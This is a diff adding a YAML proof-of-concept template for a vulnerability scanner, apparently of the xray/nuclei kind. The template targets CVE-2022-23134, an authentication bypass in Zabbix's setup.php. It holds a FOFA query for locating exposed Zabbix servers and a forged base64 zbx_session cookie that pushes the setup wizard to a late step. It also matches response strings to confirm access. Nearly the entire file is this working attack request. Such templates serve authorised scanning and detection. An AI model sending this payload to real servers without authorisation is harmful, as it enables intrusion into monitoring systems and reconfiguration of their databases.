@@ -1,0 +1,24 @@
+id: poc-yaml-zabbix-setup-authentication-bypass
+info:
+  name: zabbix setup.php 认证绕过（CVE-2022-23134）
+  severity: high
+  tags:
+  - 两高一弱
+  - 认证绕过
+  - CVE-2022-23134
+  finger: zabbix
+  fofa: app="zabbix-监控系统" && body="saml"
+variables:
+  path: '/
+
+    /zabbix/'
+requests:
+- method: GET
+  path: '{{.path}}setup.php'
+  headers:
+    Cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
+  expression: "status_code == 200 && \ncontains(body,\"Installation\") &&\ncontains(body,\"\
+    Zabbix server details\") &&\ncontains(body,\"Configure DB connection\") &&\ncontains(body,\"\
+    Zabbix\") &&\n!contains(headers,\"youtube_main\") &&\n!contains(headers,\"support.google.com\"\
+    )\n"
+transport: http
